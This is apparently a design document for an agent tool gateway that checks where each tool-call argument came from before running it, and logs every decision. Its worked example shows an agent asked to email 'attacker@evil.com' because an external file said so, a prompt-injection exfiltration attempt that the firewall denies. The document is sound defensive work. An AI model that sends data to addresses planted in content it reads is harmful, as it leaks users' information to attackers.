# Gateway Architecture

The Agent Hypervisor Tool Gateway is a **centralized execution control layer**
for AI agent tools. It intercepts every tool call from an agent, enforces
provenance-based policy, and either executes the tool, blocks it, or requests
human approval.

---

## The Tool Hub Concept

Without a gateway, an agent calls tools directly. There is no centralized point
where policy is enforced, traces are recorded, or provenance is checked.

```
Agent ──────── send_email()    ← no control
Agent ──────── http_post()     ← no control
Agent ──────── read_file()     ← no control
```

With the gateway, every tool call passes through a single enforcement point:

```
Agent
 ↓  POST /tools/execute
Tool Gateway
 ↓  PolicyEngine + ProvenanceFirewall
Provenance Firewall
 ↓  allow / deny / ask
Tool Adapter
 ↓
External System  (email · HTTP · filesystem)
```

This is the **execution switch**: a hub through which all agent tool calls must
pass, where access policy is evaluated deterministically.

---

## Full Architecture

```
┌──────────────────────────────────────────────────────────────────┐
│                        Agent / Client                            │
│        POST /tools/execute  {tool, arguments: {arg: ArgSpec}}    │
└─────────────────────────────────┬────────────────────────────────┘
                                  │
                                  ▼
┌──────────────────────────────────────────────────────────────────┐
│                         Tool Gateway                             │
│                    (gateway_server.py)                           │
│                                                                  │
│  ┌────────────────────────────────────────────────────────────┐  │
│  │                    ExecutionRouter                         │  │
│  │                  (execution_router.py)                     │  │
│  │                                                            │  │
│  │  1. Look up tool in ToolRegistry                           │  │
│  │  2. Convert ArgSpec → ValueRef (with provenance labels)    │  │
│  │  3. Build ToolCall(tool, args: dict[str, ValueRef])        │  │
│  │                                                            │  │
│  │  4. PolicyEngine.evaluate(call, registry)                  │  │◄── hot-reloadable YAML
│  │     declarative rules: allow / deny / ask                  │  │
│  │                                                            │  │
│  │  5. ProvenanceFirewall.check(call, registry)               │  │◄── structural rules
│  │     RULE-01–05: structural provenance checks               │  │    (task manifest)
│  │                                                            │  │
│  │  6. Combine: deny > ask > allow                            │  │
│  │                                                            │  │
│  │  7. Write TraceEntry (always, regardless of verdict)       │  │
│  └────────────────────┬──────────────────────────────────────┘  │
│                       │                                          │
│         ┌─────────────┼───────────────┐                          │
│         ▼             ▼               ▼                          │
│       deny           ask            allow                        │
│       403           200             200                          │
│                  approval_         execute                       │
│                  required         adapter                        │
└──────────────────────────────────────────────────────────────────┘
                                  │ allow
                                  ▼
┌──────────────────────────────────────────────────────────────────┐
│                        Tool Registry                             │
│                      (tool_registry.py)                          │
│                                                                  │
│    send_email  ──►  _adapter_send_email()   (simulated SMTP)     │
│    http_post   ──►  _adapter_http_post()    (simulated HTTP)     │
│    read_file   ──►  _adapter_read_file()    (filesystem read)    │
└─────────────────────────────────┬────────────────────────────────┘
                                  │
                                  ▼
                         External Systems
                   (email · HTTP API · filesystem)
```

---

## Provenance-Based Decisions

Every request argument carries a provenance label:

| `source` field    | ProvenanceClass     | Trust level |
|-------------------|---------------------|-------------|
| `external_document` | External content  | Untrusted   |
| `derived`         | Computed from parents | Inherited |
| `user_declared`   | Operator-declared  | Trusted     |
| `system`          | Gateway internals  | Trusted     |

The gateway converts these labels into `ValueRef` objects and passes them to
the enforcement engines. The enforcement engines walk the full derivation chain
— not just the immediate label — so provenance laundering is detected.

**Example: malicious email request blocked**

Request:
```json
{
  "tool": "send_email",
  "arguments": {
    "to": {
      "value": "attacker@evil.com",
      "source": "external_document",
      "label": "malicious_doc.txt"
    }
  }
}
```

Firewall evaluation:
```
to = "attacker@evil.com"
  provenance: external_document:malicious_doc.txt
  chain contains external_document → RULE-01 fires
verdict: deny
```

Response:
```json
{
  "verdict": "deny",
  "reason": "Recipient provenance traces to external_document — external documents cannot authorize outbound email",
  "matched_rule": "firewall:RULE-01",
  "policy_version": "a3f9c1b2",
  "trace_id": "7e4d1a9f"
}
```

**Example: clean email request requiring confirmation**

Request:
```json
{
  "tool": "send_email",
  "arguments": {
    "to": {
      "value": "alice@company.com",
      "source": "user_declared",
      "role": "recipient_source"
    }
  }
}
```

Firewall evaluation:
```
to = "alice@company.com"
  provenance: user_declared:gateway_trusted
  chain has user_declared with recipient_source role
  require_confirmation = true → RULE-05 → ask
verdict: ask
```

Response:
```json
{
  "verdict": "ask",
  "reason": "Recipient 'alice@company.com' traces to declared source 'gateway_trusted' — confirmation required",
  "matched_rule": "firewall:ask",
  "policy_version": "a3f9c1b2",
  "trace_id": "8b2c4f10"
}
```

---

## Policy Hot Reload

The PolicyEngine loads rules from a YAML file at startup. To update the policy
without restarting the server:

1. Edit `policies/default_policy.yaml`
2. POST `/policy/reload`
3. New rules apply immediately to all subsequent requests

The server responds with the new policy version (a SHA-256 hash of the policy
file content):
```json
{
  "status": "reloaded",
  "policy_version": "b4d7e29a",
  "policy_file": "policies/default_policy.yaml",
  "timestamp": "2024-01-15T12:34:56+00:00"
}
```

**Policy version is included in every response**, so you can correlate each
decision with the exact policy that was active when it was made.

**Demo: policy change changes behavior**

Start with the default policy (`deny-email-external-recipient` rule).
A malicious request is denied.

Edit the policy to remove the deny rule. Reload:
```
POST /policy/reload
```

The same malicious request now reaches the ProvenanceFirewall. RULE-01 still
fires (structural rule, not hot-reloadable). This demonstrates that the
PolicyEngine and ProvenanceFirewall are complementary layers — policy reload
changes the declarative rules but not the structural invariants.

---

## Trace Auditing

Every tool execution attempt is recorded to an in-memory trace log, regardless
of verdict. Traces are available at `GET /traces`.

Example trace entry:
```json
{
  "trace_id": "7e4d1a9f",
  "timestamp": "2024-01-15T12:34:56.123456+00:00",
  "tool": "send_email",
  "call_id": "gw-7e4d1a9f",
  "policy_engine_verdict": "deny",
  "firewall_verdict": "deny",
  "final_verdict": "deny",
  "reason": "Recipient provenance traces to external_document",
  "matched_rule": "deny-email-external-recipient",
  "policy_version": "a3f9c1b2",
  "arg_provenance": {
    "to": "external_document:malicious_doc.txt",
    "subject": "system:system",
    "body": "system:system"
  },
  "result_summary": null
}
```

Trace fields:
- `policy_engine_verdict` — what the declarative rules said
- `firewall_verdict` — what the structural firewall said
- `final_verdict` — the winning verdict (deny > ask > allow)
- `arg_provenance` — full provenance chain for each argument
- `matched_rule` — the specific rule that determined the final verdict

Traces provide a complete audit trail for security review, incident response,
and policy tuning.

---

## HTTP API Reference

### `GET /`
Gateway status, registered tools, and current policy version.

### `POST /tools/list`
List all registered tools with name, description, and side_effect_class.

### `POST /tools/execute`
Execute a tool with provenance-based access control.

**Request:**
```json
{
  "tool": "send_email",
  "arguments": {
    "<arg_name>": {
      "value": "<arg_value>",
      "source": "external_document | derived | user_declared | system",
      "parents": ["<parent_arg_name>"],
      "role": "<optional_role>",
      "label": "<human-readable origin>"
    }
  },
  "call_id": "<optional_client_id>",
  "provenance": {"session_id": "..."}
}
```

**Response:**
```json
{
  "verdict": "allow | deny | ask",
  "reason": "<explanation>",
  "matched_rule": "<rule_id>",
  "policy_version": "<hash>",
  "trace_id": "<id>",
  "result": "<tool_output_or_null>"
}
```

HTTP status: 200 for allow/ask, 403 for deny.

### `POST /policy/reload`
Hot-reload policy rules from disk. Returns new policy version.

### `GET /traces?limit=N`
Return up to N recent trace entries (newest first, default 50, max 500).

---

## Running the Gateway

```bash
# Start with default config
python scripts/run_gateway.py

# Start with custom config
python scripts/run_gateway.py --config gateway_config.yaml

# Override port
python scripts/run_gateway.py --port 9000
```

The gateway listens on `http://127.0.0.1:8080` by default.

---

## Component Map

```
src/agent_hypervisor/gateway/
  __init__.py           package entry point
  config_loader.py      GatewayConfig, load_config() — parse gateway_config.yaml
  tool_registry.py      ToolDefinition, ToolRegistry, built-in adapters
  execution_router.py   ExecutionRouter — core enforcement pipeline
  gateway_server.py     FastAPI app — HTTP endpoints and gateway state

gateway_config.yaml     root-level configuration file
scripts/run_gateway.py  CLI entrypoint
```
